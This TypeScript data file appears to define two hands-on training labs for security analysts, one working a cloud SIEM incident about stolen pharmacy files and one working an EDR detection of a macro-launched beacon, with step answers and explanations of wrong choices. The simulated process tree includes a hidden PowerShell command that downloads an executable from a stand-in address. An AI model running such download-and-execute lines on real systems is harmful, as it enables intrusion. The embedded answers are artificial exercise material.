import type { BriefingLab } from "./types";

// Console labs: the job done in the console, in the order the vendor's own docs give it.
// Sentinel follows Microsoft's incident pages (grid, details pane, View full details,
// entities, Logs with a bookmark, Run playbook, close with a classification). The EDR lab
// follows docs/ui-reference/real-console-ui.md. No logos or product names in the chrome.

type Portal = Extract<BriefingLab, { kind: "portal" }>;

// ─── Sentinel: Ashgrove Pharmacy, the p.vasquez incident ─────────────────────
export const SENTINEL_INCIDENT_LAB: Portal = {
  kind: "portal",
  skin: "azure",
  title: "Work the Incident in the Portal",
  prompt: "22:40 at Ashgrove. You have the desk and the workspace open. Malik wants this one worked the way the job really goes: from the queue to a closed incident, with nothing skipped.",
  product: "Cloud portal",
  resource: "ash-sentinel",
  tenant: "ashgrove.example",
  home: "overview",
  menu: [
    { items: [{ id: "overview", label: "Overview" }, { id: "logs", label: "Logs" }] },
    { group: "Threat management", items: [{ id: "incidents", label: "Incidents" }, { id: "workbooks", label: "Workbooks" }, { id: "hunting", label: "Hunting" }, { id: "ti", label: "Threat intelligence" }] },
    { group: "Configuration", items: [{ id: "analytics", label: "Analytics" }, { id: "automation", label: "Automation" }, { id: "connectors", label: "Data connectors" }] },
  ],
  pages: {
    overview: { heading: "Overview", tiles: [{ label: "Events", value: "4.1M" }, { label: "Alerts", value: "37" }, { label: "Open incidents", value: "6" }], note: "Everything in the last 24 hours. An analyst's work is not on this page." },
    logs: { heading: "Logs", query: "// Open a query from an incident: it arrives scoped to that incident's time and entities", note: "Tables: SigninLogs, AuditLogs, OfficeActivity, SecurityIncident, SecurityAlert" },
    incidents: {
      heading: "Incidents",
      commands: [{ id: "create", label: "Create incident" }, { id: "actions", label: "Actions" }],
      tiles: [{ label: "Open incidents", value: "6" }, { label: "New incidents", value: "4" }, { label: "Active incidents", value: "2" }],
      filters: ["Severity : All", "Status : 2 selected", "Owner : All", "Product name : All"],
      table: {
        columns: ["Severity", "Incident ID", "Title", "Alerts", "Owner", "Status", "Tactics"],
        rows: [
          { id: "2291", tone: "high", record: "2291", cells: ["High", "2291", "Data access after sign-in from an anonymous proxy", "3", "Unassigned", "New", "Initial Access, Collection"] },
          { id: "2288", tone: "high", record: "2288", cells: ["High", "2288", "Password spray against shop accounts", "2", "R. Nowak", "Active", "Credential Access"] },
          { id: "2285", tone: "medium", record: "2285", cells: ["Medium", "2285", "Mass download by a service account", "1", "Unassigned", "New", "Collection"] },
          { id: "2279", tone: "low", record: "2279", cells: ["Low", "2279", "Rare application consent", "1", "Unassigned", "New", "Persistence"] },
        ],
      },
    },
    workbooks: { heading: "Workbooks", note: "Dashboards built on the same tables." },
    hunting: { heading: "Hunting", note: "Proactive queries. Nothing here is assigned to you tonight." },
    ti: { heading: "Threat intelligence", note: "Indicators matched against your logs." },
    analytics: { heading: "Analytics", note: "The scheduled rules that create alerts. Changing one is not how you answer an incident." },
    automation: { heading: "Automation", note: "Automation rules and playbooks." },
    connectors: { heading: "Data connectors", note: "How logs reach the workspace." },
  },
  records: {
    "2291": {
      id: "2291",
      title: "Data access after sign-in from an anonymous proxy",
      strip: [
        { field: "severity", label: "Severity", value: "High", tone: "high", options: ["High", "Medium", "Low", "Informational"] },
        { field: "status", label: "Status", value: "New", options: ["New", "Active", "Closed"] },
        { field: "owner", label: "Owner", value: "Unassigned", options: ["Assign to me", "R. Nowak", "Unassigned"] },
      ],
      facts: [["Workspace name", "ash-sentinel"], ["Alert product names", "Scheduled analytics rules"], ["Creation time", "22:27"]],
      evidence: [["Events", "418"], ["Alerts", "3"], ["Bookmarks", "0"]],
      entities: [
        { id: "acct", label: "p.vasquez@ashgrove.example", type: "Account", seen: "3 alerts" },
        { id: "ip1", label: "203.0.113.140", type: "IP", seen: "2 alerts" },
        { id: "ip2", label: "198.51.100.230", type: "IP", seen: "1 alert" },
        { id: "site", label: "Dispensing site", type: "URL", seen: "1 alert" },
      ],
      tactics: "Initial Access (1), Collection (1), Persistence (1)",
      timeline: [
        { time: "22:26", text: "Inbox rule forwarding to an outside address", tone: "high" },
        { time: "22:19", text: "410 files downloaded from the Dispensing site", tone: "high" },
        { time: "22:10", text: "Sign-in from an anonymous proxy", tone: "medium" },
      ],
      actions: [{ id: "playbook", label: "Run playbook" }, { id: "automation", label: "Create automation rule" }, { id: "team", label: "Create team" }],
      closing: ["True Positive - suspicious activity", "Benign Positive - suspicious but expected", "False Positive - incorrect alert logic", "False Positive - incorrect data", "Undetermined"],
      logs: {
        query: "OfficeActivity\n| where UserId == \"p.vasquez@ashgrove.example\"\n| where Operation == \"FileDownloaded\"\n| summarize Files = count() by ClientIP, Site_Url, bin(TimeGenerated, 5m)",
        columns: ["TimeGenerated", "ClientIP", "Site_Url", "Files"],
        rows: [
          { id: "l1", cells: ["21:05", "192.0.2.40", "/sites/Rotas", "3"] },
          { id: "l2", cells: ["22:15", "203.0.113.140", "/sites/Dispensing", "410"] },
          { id: "l3", cells: ["22:20", "192.0.2.40", "/sites/Rotas", "1"] },
        ],
      },
    },
    "2288": { id: "2288", title: "Password spray against shop accounts", facts: [["Owner", "R. Nowak"], ["Status", "Active"], ["Note", "Already being worked"]] },
    "2285": { id: "2285", title: "Mass download by a service account", facts: [["Owner", "Unassigned"], ["Status", "New"], ["Severity", "Medium"]] },
    "2279": { id: "2279", title: "Rare application consent", facts: [["Owner", "Unassigned"], ["Status", "New"], ["Severity", "Low"]] },
  },
  steps: [
    { id: "queue", ask: "Get to your work queue.", hint: "Threat management, in the resource menu on the left.", target: "menu:incidents", why: "Alerts are grouped into incidents, so the incident grid is where a Sentinel analyst works, not the raw alert list." },
    { id: "pick", ask: "Open the incident that needs you most.", hint: "Read Severity, Owner and Status together, not just the top row.", target: "row:2291", why: "High, New and Unassigned: nobody is on it. Selecting a row opens the details pane on the right without leaving the grid." },
    { id: "full", ask: "Open the whole incident.", hint: "The details pane has a button for it.", target: "action:full", why: "View full details opens the incident page: the same left panel, plus the timeline, entities and tools." },
    { id: "own", ask: "Make it yours, so nobody else picks it up.", hint: "The Owner drop-down, in the strip at the top of the left panel.", target: "set:owner:Assign to me", why: "Ownership first. An unowned incident can be worked twice, or not at all." },
    { id: "active", ask: "Show the shift that it is being worked.", hint: "The Status drop-down.", target: "set:status:Active", why: "Status tells the rest of the shift, and the metrics, that this is in progress. Severity stays as it is: nothing you know yet changes it." },
    { id: "entity", ask: "Find the entity all three alerts share: the playbook has to act on it.", hint: "Entities in the left panel or the Entities tab. Each one says how many alerts it appears in.", target: "action:entity:acct", why: "Three alerts, one account. The two IP addresses each appear in only some of them, so blocking one would leave the attacker working from the other." },
    { id: "logs", ask: "Open the logs behind the incident, without leaving it.", hint: "The Logs button in the bar under the title.", target: "action:logs", why: "Logs opens inside the incident page, so you never lose your place. This query shows the account's downloads." },
    { id: "row", ask: "Select the row that proves the theft.", hint: "Compare the address and the file count with the rest of this user's day.", target: "row:l2", why: "410 files from the anonymous proxy address, against a handful from the shop's own network." },
    { id: "bookmark", ask: "Keep that row with the incident.", hint: "Under the results.", target: "action:bookmark", why: "A bookmark puts the evidence on the incident timeline, so the next reader sees exactly what you saw." },
    { id: "play", ask: "Respond: start the response on the account.", hint: "Incident actions, top right.", target: "action:playbook", why: "Run playbook starts the prepared response from inside the incident. Malik's playbook revokes the sessions and sends the disable to a human for approval." },
    { id: "close", ask: "It is contained. Close the incident.", hint: "Status again.", target: "set:status:Closed", why: "Closing is not a status change alone: Sentinel makes you say what this was." },
    { id: "class", ask: "Choose the classification.", hint: "Real attacker, real theft, and now contained.", target: "set:classification:True Positive - suspicious activity", why: "True Positive feeds the metrics and tuning honestly. Calling a real attack Benign or False would train the team to ignore the next one." },
  ],
  traps: {
    "row:2288": "2288 is High too, but R. Nowak already owns it and it is Active. Two analysts on one incident is how work gets lost: pick the one nobody has.",
    "action:create": "You don't need a new incident: Sentinel already grouped these alerts. A duplicate would split the evidence.",
    "action:entity:ip1": "203.0.113.140 appears in two alerts, not all three: the inbox rule came from another address. Acting on it would leave the attacker a way in.",
    "action:entity:ip2": "198.51.100.230 appears in only one alert. An attacker changes addresses easily: the account is what ties the incident together.",
    "action:entity:site": "The site is what was taken, not who took it. A playbook needs the account.",
    "action:automation": "An automation rule changes how future incidents are handled. This attacker is active now: respond to this one first.",
    "action:team": "A Teams channel helps a large incident, but it stops nothing. Respond first.",
    "row:l1": "21:05 is the shop's own network and three files: normal work.",
    "row:l3": "This is the real user back on the shop network. It proves nothing about the theft.",
    "set:severity:Low": "Nothing you found lowers this. Severity changes when the facts change, not to clear the queue.",
    "set:classification:Benign Positive - suspicious but expected": "Benign Positive means real but authorised, like a penetration test. Nobody authorised this.",
    "set:classification:False Positive - incorrect alert logic": "The rule fired correctly on a real attack. False Positive would send the team to weaken a rule that worked.",
    "set:classification:False Positive - incorrect data": "The data was correct: it is what proved the theft.",
    "set:classification:Undetermined": "You have the evidence bookmarked. Undetermined is for cases you could not resolve.",
  },
  lesson: "The order is the job: find it in the grid, own it, set it Active, tie the alerts together through their entities, prove it in Logs and bookmark the row, respond from Incident actions, then close with an honest classification. Every step leaves a trail for the next analyst.",
};

// ─── EDR: Brightmoor Hotels, the Lisbon night auditor's laptop ───────────────
export const EDR_DETECTION_LAB: Portal = {
  kind: "portal",
  skin: "edr",
  title: "Work the Detection in the Console",
  prompt: "02:10. Tobias is on the phone from London and the console is open in front of you. The night auditor's laptop in Lisbon is calling a server nobody recognises. Work it from the detection to a contained host.",
  product: "EDR console",
  resource: "Brightmoor",
  tenant: "brightmoor.example",
  home: "dash",
  menu: [
    { items: [{ id: "dash", label: "Dashboard" }] },
    { group: "Endpoint security", items: [{ id: "detections", label: "Endpoint detections" }, { id: "ioc", label: "IOC management" }, { id: "prevention", label: "Prevention policies" }] },
    { group: "Host setup and management", items: [{ id: "hosts", label: "Host management" }, { id: "groups", label: "Host groups" }] },
  ],
  pages: {
    dash: { heading: "Dashboard", tiles: [{ label: "New detections", value: "4" }, { label: "Hosts online", value: "3,412" }, { label: "Contained", value: "0" }], note: "A summary. Detections are worked from the list." },
    detections: {
      heading: "Endpoint detections",
      filters: ["Status: New", "Last 24 hours"],
      table: {
        columns: ["Severity", "Detect time", "Hostname", "Tactic & technique", "Triggering file", "Status"],
        rows: [
          { id: "d1", tone: "critical", record: "d1", cells: ["Critical", "02:02", "BMH-LIS-NA07", "Command and Control via Application Layer Protocol", "svc-update.exe", "New"] },
          { id: "d2", tone: "medium", record: "d2", cells: ["Medium", "01:44", "BMH-LON-IT03", "Discovery via Network Service Scanning", "nmap.exe", "New"] },
          { id: "d3", tone: "low", record: "d3", cells: ["Low", "00:51", "BMH-OPO-KIT1", "Machine Learning via Sensor-based ML", "stocksync.exe", "New"] },
        ],
      },
    },
    hosts: {
      heading: "Host management",
      filters: ["Status: Online", "Hostname: BMH-LIS"],
      table: {
        columns: ["Hostname", "Type", "OS version", "Status", "Last seen", "Containment"],
        rows: [
          { id: "h-dc", cells: ["BMH-LIS-DC01", "Domain Controller", "Windows Server 2022", "Online", "02:09", "Normal"] },
          { id: "h-na07", record: "h-na07", cells: ["BMH-LIS-NA07", "Workstation", "Windows 11", "Online", "02:09", "Normal"] },
          { id: "h-fd01", cells: ["BMH-LIS-FD01", "Workstation", "Windows 11", "Online", "02:08", "Normal"] },
        ],
      },
    },
    ioc: { heading: "IOC management", note: "Custom indicators. A block here helps later hosts, not this one." },
    prevention: { heading: "Prevention policies", note: "What the sensor blocks. Not the place to answer a live detection." },
    groups: { heading: "Host groups", note: "Which policies each host gets." },
  },
  records: {
    d1: {
      id: "d1",
      title: "BMH-LIS-NA07",
      strip: [
        { field: "status", label: "Status", value: "New", options: ["New", "In progress", "True positive", "False positive", "Ignored"] },
        { field: "assign", label: "Assigned to", value: "Unassigned", options: ["Assign to me", "T. Wren"] },
      ],
      facts: [["Severity", "Critical"], ["Objective", "Keep Access"], ["Tactic & technique", "Command and Control via Application Layer Protocol"], ["Technique ID", "T1071"], ["User name", "a.ferreira"]],
      tree: [
        { id: "exp", depth: 0, name: "explorer.exe", detail: "user shell", facts: [["Command line", "C:\\Windows\\explorer.exe"]] },
        { id: "out", depth: 1, name: "OUTLOOK.EXE", detail: "mail client", facts: [["Command line", "\"C:\\Program Files\\Microsoft Office\\OUTLOOK.EXE\""]] },
        { id: "xl", depth: 2, name: "EXCEL.EXE", detail: "opened an attachment", facts: [["Command line", "EXCEL.EXE C:\\Users\\a.ferreira\\Downloads\\rates-2026.xlsm"]] },
        { id: "ps", depth: 3, name: "powershell.exe", detail: "started by Excel", facts: [["Command line", "powershell.exe -w hidden -c iwr hxxp://198.51.100.66/u -o C:\\Users\\Public\\svc-update.exe"]] },
        { id: "svc", depth: 4, name: "svc-update.exe", detail: "1 network, 1 registry", bad: true, facts: [["File path", "C:\\Users\\Public\\svc-update.exe"], ["Remote address", "198.51.100.66:443"]] },
      ],
      actions: [{ id: "hide", label: "Hide detection" }, { id: "rtr", label: "Connect to host" }],
    },
    d2: { id: "d2", title: "BMH-LON-IT03", facts: [["Severity", "Medium"], ["User name", "it.scan (IT team)"], ["Note", "Scheduled inventory scan from the London IT team"]] },
    d3: { id: "d3", title: "BMH-OPO-KIT1", facts: [["Severity", "Low"], ["Triggering file", "stocksync.exe"], ["Note", "The nightly stock-sync job"]] },
    "h-na07": {
      id: "h-na07",
      title: "BMH-LIS-NA07",
      facts: [["Type", "Workstation"], ["Host groups", "Lisbon front office"], ["Prevention policy", "Hotels standard"], ["Containment status", "Normal"]],
      actions: [{ id: "contain", label: "Network contain" }, { id: "hidehost", label: "Hide host" }, { id: "reboot", label: "Reboot" }],
    },
  },
  steps: [
    { id: "list", ask: "Open the list of detections.", hint: "Endpoint security, in the menu on the left.", target: "menu:detections", why: "Detections are worked from this list, not from the dashboard." },
    { id: "pick", ask: "Open the detection that matches the call from Lisbon.", hint: "Severity, then the hostname.", target: "row:d1", why: "Critical, on the Lisbon night auditor's laptop, command and control. Details open beside a process tree." },
    { id: "own", ask: "Take it, before you do anything else.", hint: "Assigned to, beside the title.", target: "set:assign:Assign to me", why: "Assignment tells the team this is being handled." },
    { id: "work", ask: "Mark it as being worked.", hint: "Status, beside the title.", target: "set:status:In progress", why: "In progress, not True positive: you haven't proved it yet." },
    { id: "tree", ask: "In the process tree, select the process making the outside connection.", hint: "Follow the chain down from the mail client to the end.", target: "tree:svc", why: "svc-update.exe, running from C:\\Users\\Public: the end of the chain from Outlook to Excel to PowerShell, with a remote address in its details." },
    { id: "goal", ask: "Which field says what the attacker was after?", hint: "Read the details panel: one field names the goal in plain words, apart from the tactic.", target: "action:field:Objective", why: "Objective is the plain-language goal behind the technique: here, keeping access. It tells you this is an intrusion, not a one-off." },
    { id: "hosts", ask: "Before you cut anything off, go and check the host.", hint: "Host setup and management.", target: "menu:hosts", why: "Containing a host has a cost. Check what it is first." },
    { id: "host", ask: "Open the right machine, and read what it is.", hint: "The hostname from the detection.", target: "row:h-na07", why: "A workstation: safe to contain. A similarly named domain controller on the same site is a very different decision." },
    { id: "contain", ask: "Stop it calling out, and keep your remote access to it.", hint: "The actions at the top of the host.", target: "action:contain", why: "Network contain cuts the host off from everything except the cloud console, so you can still investigate. A reboot would destroy memory evidence and leave the persistence in place." },
    { id: "back", ask: "Go back to the detection to finish the record.", hint: "Endpoint detections.", target: "menu:detections", why: "The record has to match what you found." },
    { id: "reopen", ask: "Open it again.", hint: "The same row.", target: "row:d1", why: "Its status is still In progress." },
    { id: "tp", ask: "Record your verdict.", hint: "Status, beside the title.", target: "set:status:True positive", why: "You have the chain, the path and the outbound address. True positive, with the host contained." },
  ],
  traps: {
    "row:d2": "An inventory scan by the IT team, at Medium. It is not what Lisbon called about, and a Critical is waiting.",
    "row:d3": "The nightly stock-sync job on a kitchen PC, at Low. Critical comes first.",
    "row:h-dc": "BMH-LIS-DC01 is a domain controller. The detection is on NA07: cutting off a DC would take the whole hotel's sign-ins with it.",
    "row:h-fd01": "Right site, wrong machine. The detection is on BMH-LIS-NA07: read the hostname.",
    "action:hide": "Hiding removes it from the list. The beacon would keep running, unseen.",
    "action:hidehost": "Hide host removes it from the console. It would still be beaconing, and you would no longer see it.",
    "action:reboot": "A reboot wipes what is in memory, and the Run key would bring it straight back. Contain it instead.",
    "tree:exp": "explorer.exe is the user's normal shell: where the chain starts, not what is calling out.",
    "tree:out": "Outlook delivered the file. It makes no connection to this address.",
    "tree:xl": "Excel ran the macro, but it isn't the process holding the connection. Follow the chain down.",
    "tree:ps": "PowerShell fetched the payload and exited. Look at what it started.",
    "set:status:False positive": "Nothing here is false: an Office macro led to a binary in a public folder calling out.",
    "set:status:Ignored": "Ignoring a Critical on a live host is how intrusions run for weeks.",
  },
  lesson: "Work it in order: find the detection, take ownership, read the chain in the process tree, check the host before you act, contain it so that you keep your access, and only then record the verdict. Containing first is right, but checking what you are about to cut off takes seconds.",
};
